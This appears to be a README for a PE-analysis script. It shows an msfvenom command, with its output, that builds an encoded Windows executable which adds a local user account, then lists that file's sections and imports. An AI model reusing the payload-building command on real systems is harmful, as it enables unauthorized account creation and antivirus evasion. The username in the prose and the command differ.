# Malware-Analysis

Create Malicious exe file using Metasploit module (msfvenom) that adds a user "testuser321" and password "Test@321". Encode the file using encoder shikata_ga_nai with iteration 10 times as shown below.

root@kali64:~# msfvenom -p windows/adduser user=testuser1 pass=Test@321 -e x86/shikata_ga_nai -i 10 -f exe -o ~/testadd10.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload  

[-] No arch selected, selecting arch: x86 from the payload  
Found 1 compatible encoders  
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai  
x86/shikata_ga_nai succeeded with size 303 (iteration=0)
x86/shikata_ga_nai succeeded with size 330 (iteration=1)
....
x86/shikata_ga_nai succeeded with size 519 (iteration=8)
x86/shikata_ga_nai succeeded with size 546 (iteration=9)
x86/shikata_ga_nai chosen with final size 546
Payload size: 546 bytes
Final size of exe file: 73802 bytes
Saved as: /root/testadd10.exe
root@kali64:~# 

# Getting Started & Examples
The script will show the sections & its virtual address and IAT of the file as shown below    

root@kali64:~# python pe_test.py testadd10.exe
Sections:.text, Virtual Address:0x1000\
Sections:.rdata, Virtual Address:0xc000\
Sections:.data, Virtual Address:0xd000\
Sections:.rsrc, Virtual Address:0x15000

-------------------------------------------
List of IAT

MSVCRT.dll\
	_iob\
	_except_handler3\
    .....................
	_strdup\
	_strnicmp\
KERNEL32.dll\
	PeekNamedPipe\
	ReadFile\
	WriteFile\
       ....................
